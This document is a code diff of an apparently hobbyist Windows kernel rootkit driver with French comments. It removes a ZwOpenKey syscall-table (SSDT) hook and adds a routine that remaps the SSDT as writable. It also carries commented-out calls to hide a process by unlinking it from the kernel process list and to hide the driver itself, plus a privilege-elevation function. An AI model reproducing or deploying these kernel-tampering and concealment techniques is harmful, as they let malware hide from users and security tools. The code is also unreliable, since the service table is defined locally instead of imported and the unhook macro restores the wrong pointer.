@@ -118,70 +118,49 @@ int ElevateSpecificPID(int targetPID) {
 
 //https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/index.htm
 
-
-typedef struct ServiceDescriptorEntry {
-    unsigned int* ServiceTableBase;
-    unsigned int* ServiceCounterTableBase; //Used only in checked build
-    unsigned int NumberOfServices;
+typedef struct SystemServiceDescriptorTable {
+    void* ServiceTableBase;
+    void* ServiceCounterTableBase;
+    unsigned int          NumberOfServices;
     unsigned char* ParamTableBase;
-} ServiceDescriptorTableEntry_t, * PServiceDescriptorTableEntry_t;
+} SSDT;
+
+unsigned long* g_pMappedSCT;
+MDL* g_pMdlSCT;//init memory descriptor list
 
 
 
+SSDT KeServiceDescriptorTable;
 
-
-LARGE_INTEGER					m_UserTime;
-LARGE_INTEGER					m_KernelTime;
-
-typedef NTSYSAPI(*ZWOPENKEY)(
-    PHANDLE KeyHandle,
-    ACCESS_MASK DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes
-    );
-PMDL  g_pmdlSystemCall; // *MDL
-PVOID* MappedSystemCallTable;
-ZWOPENKEY OldregOpenKey;
-
-ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
-#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)] //prends une adresse éxportée par ntosrknl et renvoie l'adresse de la fonction exportée par la ssdt
-#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
-#define HOOK_SYSCALL(_Function, _Hook, _Orig )  _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
-
-#define UNHOOK_SYSCALL(_Function, _Hook, _Orig ) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
-
-
-
-
-
-NTSTATUS NewZwOpenKey(PHANDLE KeyHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes) {
-    DbgPrintEx(0, 0, "OpenKey hook !\n");
-    NTSTATUS Status;
-    Status = OldregOpenKey(KeyHandle, DesiredAccess, ObjectAttributes);
-    return Status;
-}
-int tryHook() {
-    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;//Initialise les variables de temps global à 0 et les syncro
-    OldregOpenKey = (ZWOPENKEY)(SYSTEMSERVICE(ZwOpenKey));
-    //Memory Descriptor List, alloue de la mémoire dans la nonpagedpool, avec les droits d'écriture (pour corrompre la SSDT)
-    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices * 4);
-    if (!g_pmdlSystemCall) {
-        return STATUS_UNSUCCESSFUL;
+int ssdt_init()
+{
+    g_pMdlSCT = IoAllocateMdl(KeServiceDescriptorTable.ServiceTableBase,KeServiceDescriptorTable.NumberOfServices * 4,FALSE, FALSE, NULL);
+    if (!g_pMdlSCT)
+    {
+        DbgPrintEx(0, 0, "MDL not allocated...\n");
+        return -1;
     }
-    //https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmbuildmdlfornonpagedpool
-    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
 
-    // Change l'autorisation de la page map
-    g_pmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
-    MmMapLockedPagesSpecifyCache(g_pmdlSystemCall, KernelMode, MmNonCached/*on prend pas de risques*/, NULL, FALSE, 0);
-    HOOK_SYSCALL(ZwOpenKey,DbgPrintEx, OldregOpenKey);
+    MmBuildMdlForNonPagedPool(g_pMdlSCT);
+
+    g_pMdlSCT->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
+
+    g_pMappedSCT = MmMapLockedPagesSpecifyCache(g_pMdlSCT, KernelMode, MmNonCached, NULL, FALSE, HighPagePriority);
+
+
     return 1;
+
 }
+
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
-    tryHook();
-    //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "firefox.exe");
+    //SearchAndRemoveEPROCESSbyOffset("pwnme.exe");
+    //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "pwnme.exe");
     //HideDriverSection(DriverObject);
+    if (ssdt_init() == 1) {
+        DbgPrintEx(0, 0, "Ouais c'est greg\n");
+    }
     return STATUS_SUCCESS;
 }
